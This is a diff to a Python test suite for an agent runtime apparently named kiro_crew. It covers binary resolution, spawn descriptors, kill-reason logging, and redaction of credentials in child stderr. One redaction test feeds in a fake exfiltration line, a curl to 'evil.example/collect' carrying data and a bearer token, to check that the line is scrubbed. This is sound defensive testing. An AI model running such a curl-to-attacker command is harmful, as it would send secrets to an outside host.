@@ -83,6 +83,18 @@ def _fast_no_report_ceiling(monkeypatch):
     monkeypatch.setattr(sh, "_MCP_DRAIN_NO_REPORT_CEILING", 0.05, raising=False)
 
 
+def _spawn_client_mod():
+    """The module that DEFINES the trusted-binary resolver every spawn uses.
+
+    A harness resolves it there at call time, so a patch aimed at some other
+    module's re-export would leave the real filesystem search running while the
+    test believed it was stubbed.
+    """
+    import kiro_crew.acp.client as client_mod
+
+    return client_mod
+
+
 def _make_runtime():
     """An initialized AcpRuntime wired to a fake subprocess.
 
@@ -826,14 +838,26 @@ def test_runtime_reuses_clients_oversize_drain_helper():
 
 
 def test_runtime_uses_clients_augmented_kiro_bin_resolver():
-    """spawn() must resolve kiro-cli via the SAME augmented-PATH resolver as
-    AcpClient (honours KIROCREW_KIRO_BIN + augmented_path so a non-login gateway
-    finds a ~/.local/bin install). A bare shutil.which(PATH) duplicate regressed
-    the kiro/_bg path to 'kiro-cli not found in PATH'. Assert single-source."""
-    import kiro_crew.acp.client as client_mod
-    import kiro_crew.acp.runtime as runtime_mod
+    """Every spawn path must resolve kiro-cli via the SAME augmented-PATH resolver
+    as AcpClient (honours KIROCREW_KIRO_BIN + augmented_path so a non-login
+    gateway finds a ~/.local/bin install). A bare shutil.which(PATH) duplicate
+    regressed the kiro/_bg path to 'kiro-cli not found in PATH'. Assert
+    single-source.
 
-    assert runtime_mod._resolve_kiro_bin_for_spawn is client_mod._resolve_kiro_bin_for_spawn
+    Read as SOURCE rather than by identity because each kiro-family harness
+    resolves the binary at call time, which is what lets a test patch the
+    resolver at its definition site instead of at a re-export that may not
+    exist."""
+    import inspect
+
+    import kiro_crew.acp.client as client_mod
+    from kiro_crew.acp.harness import KasHarness, KiroHarness
+
+    assert hasattr(client_mod, "_resolve_kiro_bin_for_spawn")
+    for harness in (KiroHarness, KasHarness):
+        source = inspect.getsource(harness.resolve_spawn)
+        assert "_resolve_kiro_bin_for_spawn" in source, harness.__name__
+        assert "shutil.which" not in source, harness.__name__
 
 
 @pytest.mark.parametrize("backend", [None, ACP_BACKEND_KAS])
@@ -861,7 +885,6 @@ async def test_runtime_missing_kiro_bin_reports_the_directories_it_searched(back
     have to answer the same question.
     """
     import kiro_crew.acp.client as client_mod
-    import kiro_crew.acp.runtime as runtime_mod
 
     searched = [os.path.join(os.sep, "managed-bin"), os.path.join(os.sep, "path-bin")]
     unsearched = os.path.join(os.sep, "never-checked")
@@ -873,11 +896,11 @@ async def test_runtime_missing_kiro_bin_reports_the_directories_it_searched(back
         return None
 
     with (
-        patch.object(runtime_mod, "_resolve_kiro_bin_for_spawn", _no_bin),
+        patch.object(client_mod, "_resolve_kiro_bin_for_spawn", _no_bin),
         patch.object(client_mod, "known_kiro_cli_dirs", return_value=searched),
     ):
         with pytest.raises(AcpRuntimeError) as raised:
-            await rt._resolve_spawn_argv()
+            await rt._resolve_spawn_plan()
 
     message = str(raised.value)
     assert "searched 2 directories" in message
@@ -1095,13 +1118,17 @@ async def test_runtime_spawn_passes_installed_path_through_exact_wrappers(
     async def stop_spawn(*args, **kwargs):
         wrapped["spawn_args"] = args
         wrapped["spawn_kwargs"] = kwargs
+        # Read while the spawn is still in flight: its failure path closes the
+        # bound workspace descriptor and clears the attribute.
+        wrapped["bound_fd"] = runtime._bound_workspace_fd
         raise _StopSpawn()
 
     async def resolve_installed(*, environ=None, home=None):
         return launch_path
 
+    client_mod = _spawn_client_mod()
     monkeypatch.setattr(
-        runtime_mod,
+        client_mod,
         "_resolve_kiro_bin_for_spawn",
         resolve_installed,
     )
@@ -1145,10 +1172,17 @@ async def test_runtime_spawn_passes_installed_path_through_exact_wrappers(
     )
     spawn_kwargs = wrapped["spawn_kwargs"]
     assert isinstance(spawn_kwargs, dict)
-    # The installed binary is exec'd in place: no inherited snapshot descriptor,
-    # and the sibling subcommand binary a multi-call CLI dispatches to is still
+    # The installed binary is exec'd in place: the ONLY descriptor handed to the
+    # child is the verified workspace the spawn shim must `fchdir` into, never an
+    # inherited snapshot descriptor. Nothing binds a workspace off macOS, so the
+    # expected set is empty there -- asserting the exact set rather than the absence
+    # of the key keeps the same strength on Linux and stops pinning the platform's
+    # own spawn shape on darwin.
+    bound_fd = wrapped["bound_fd"]
+    expected_fds: tuple[int, ...] = () if bound_fd is None else (bound_fd,)
+    assert tuple(spawn_kwargs.get("pass_fds", ())) == expected_fds
+    # The sibling subcommand binary a multi-call CLI dispatches to is still
     # reachable beside the launch path.
-    assert "pass_fds" not in spawn_kwargs
     assert (Path(launch_path).parent / "kiro-cli-chat").exists()
 
 
@@ -1218,7 +1252,7 @@ async def test_kill_cancellation_still_releases_bound_workspace(monkeypatch, tmp
     entered = asyncio.Event()
     closed: list[int] = []
 
-    async def stalled_teardown(*, expected=False):
+    async def stalled_teardown(*, expected=False, reason=""):
         entered.set()
         await asyncio.Event().wait()
 
@@ -1341,6 +1375,69 @@ async def test_kill_default_is_unexpected_and_warns(caplog, monkeypatch):
 
 
 @pytest.mark.asyncio
+async def test_kill_reason_lands_in_death_log_and_summary(caplog, monkeypatch):
+    """kill(reason=...) attributes the death: the reason must appear in the
+    'AcpRuntime dead' log line AND be retained by death_summary() alongside
+    returncode and stderr tail. Field motivation: three unattributed
+    'killed [returncode=None]' deaths in five days — one under a live cron
+    turn — were undiagnosable because no caller identified itself."""
+    import logging
+
+    rt, _, proc = _make_runtime()
+    _neuter_kill_side_effects(monkeypatch, proc)
+
+    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
+        await rt.kill(expected=True, reason="warm mint teardown")
+
+    records = _death_records(caplog)
+    assert len(records) == 1
+    assert "killed (warm mint teardown)" in records[0].getMessage()
+    summary = rt.death_summary()
+    assert summary is not None
+    assert "killed (warm mint teardown)" in summary
+    assert "returncode=" in summary
+    assert "stderr_tail:" in summary
+
+
+@pytest.mark.asyncio
+async def test_death_summary_is_none_while_alive(monkeypatch):
+    """death_summary() answers None until _mark_dead composes it — a live
+    runtime must not advertise a stale or empty attribution."""
+    rt, _, proc = _make_runtime()
+    _neuter_kill_side_effects(monkeypatch, proc)
+    assert rt.death_summary() is None
+    await rt.kill()
+    assert rt.death_summary() is not None
+
+
+@pytest.mark.asyncio
+async def test_death_summary_redacts_credentials_from_stderr_tail(caplog, monkeypatch):
+    """The stderr tail is uninspected child output and the summary OUTLIVES
+    the log: it rides AcpProcessDied into a turn's error, and a cron failure
+    stringifies that into job.last_error, persisted to sandbox-visible
+    crons.json. Credential material in the child's stderr must therefore be
+    redacted before the summary is composed (same treatment as the send
+    path's 'ACP process exited' detail)."""
+    import logging
+
+    rt, _, proc = _make_runtime()
+    _neuter_kill_side_effects(monkeypatch, proc)
+    secret = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"
+    rt._stderr_lines = [f"auth error: token {secret} rejected"]
+
+    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
+        await rt.kill(expected=True, reason="warm mint teardown")
+
+    summary = rt.death_summary()
+    assert summary is not None
+    assert secret not in summary
+    assert "stderr_tail:" in summary
+    # The death log line gets the same redacted tail.
+    for record in _death_records(caplog):
+        assert secret not in record.getMessage()
+
+
+@pytest.mark.asyncio
 async def test_kill_refuses_info_downgrade_when_process_already_exited(caplog, monkeypatch):
     """A replacement path can observe is_alive() == False (returncode set by
     the child watcher) and kill() before the reader loop marks the death.
@@ -1385,6 +1482,96 @@ async def test_unexpected_process_exit_still_warns_with_diagnostic_shape(caplog)
     assert "process exited (rc=1)" in msg
     assert "returncode=1" in msg
     assert "stderr_tail: <none>" in msg
+
+
+# ── process-exit reason carries the child's last stderr line ──────────────────
+# A bare ``rc=1`` was all the chat error card showed when every sandboxed
+# spawn started failing because the runtime tmpfs had run out of inodes. The
+# reason handed to pending requests (and so to the card) now ends with what
+# the child last wrote to stderr, and an ENOSPC signature earns a doctor hint.
+
+
+@pytest.mark.asyncio
+async def test_exit_reason_appends_last_nonempty_stderr_line():
+    rt, reader, proc = _make_runtime()
+    proc.returncode = 1
+    rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
+    fut: asyncio.Future = asyncio.get_event_loop().create_future()
+    rt._pending_requests[3] = fut
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        with pytest.raises(AcpRuntimeDead) as ei:
+            await asyncio.wait_for(fut, timeout=1.0)
+    finally:
+        await _stop_reader(task)
+    msg = str(ei.value)
+    assert msg.startswith("process exited (rc=1): Error: failed to create sandbox dir")
+    assert "warming up" not in msg
+    assert "kirocrew doctor" not in msg
+
+
+def test_exit_reason_without_stderr_is_unchanged():
+    rt, _reader, _proc = _make_runtime()
+    assert rt._exit_reason(1) == "process exited (rc=1)"
+    rt._stderr_lines = ["", "  "]
+    assert rt._exit_reason(None) == "process exited (rc=None)"
+
+
+def test_exit_reason_enospc_points_at_doctor():
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = ["mkdir: cannot create directory: No space left on device (os error 28)"]
+    msg = rt._exit_reason(1)
+    assert "No space left on device" in msg
+    assert "kirocrew doctor" in msg
+    # Case-insensitive: the marker's spelling varies by libc / language runtime.
+    rt._stderr_lines = ["ENOSPC: no space left on device, mkdir '/run/user/1000/tmpx'"]
+    assert "kirocrew doctor" in rt._exit_reason(1)
+
+
+def test_exit_reason_redacts_credentials_and_exfil_urls_in_the_tail():
+    import kiro_crew.acp.runtime as rt_mod
+
+    rt, _reader, _proc = _make_runtime()
+    payload = "A" * 80
+    rt._stderr_lines = [
+        f"auth failed: curl https://evil.example/collect?data={payload} "
+        "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
+    ]
+    msg = rt._exit_reason(1)
+    assert "AKIAIOSFODNN7EXAMPLE" not in msg
+    assert payload not in msg
+    assert "auth failed" in msg
+    # The cut lands AFTER redaction, so a long line cannot leave a secret's
+    # first half in the shown prefix.
+    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"]
+    assert "AKIAIOSFODNN7" not in rt._exit_reason(1)
+
+
+def test_exit_reason_tail_is_bounded_to_one_line():
+    from kiro_crew.acp import runtime as rt_mod
+
+    assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
+    msg = rt._exit_reason(1)
+    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + 64
+    assert msg.endswith("…")
+    # Exactly at the cap nothing is cut.
+    rt._stderr_lines = ["y" * rt_mod._STDERR_REASON_TAIL_CHARS]
+    assert not rt._exit_reason(1).endswith("…")
+
+
+def test_exit_reason_enospc_hint_survives_the_tail_cap():
+    """The signature is matched on the whole line: a marker past the cap
+    still points at the doctor even though the card shows only the head."""
+    from kiro_crew.acp import runtime as rt_mod
+
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = ["z" * rt_mod._STDERR_REASON_TAIL_CHARS + " No space left on device"]
+    msg = rt._exit_reason(1)
+    assert "No space left on device" not in msg
+    assert "kirocrew doctor" in msg
 
 
 # ── Send paths ──
@@ -6235,8 +6422,9 @@ async def test_runtime_spawn_scrubs_sensitive_env_on_default_auto(monkeypatch):
     async def resolve_kiro_bin(*, environ=None, home=None):
         return "/fake/kiro"
 
+    client_mod = _spawn_client_mod()
     monkeypatch.setattr(
-        runtime_mod,
+        client_mod,
         "_resolve_kiro_bin_for_spawn",
         resolve_kiro_bin,
     )
@@ -6297,7 +6485,7 @@ async def test_runtime_spawn_names_its_own_browser_session(monkeypatch):
     async def resolve_kiro_bin(*, environ=None, home=None):
         return "/fake/kiro"
 
-    monkeypatch.setattr(runtime_mod, "_resolve_kiro_bin_for_spawn", resolve_kiro_bin)
+    monkeypatch.setattr(_spawn_client_mod(), "_resolve_kiro_bin_for_spawn", resolve_kiro_bin)
     monkeypatch.setattr(
         runtime_mod,
         "wrap_argv",
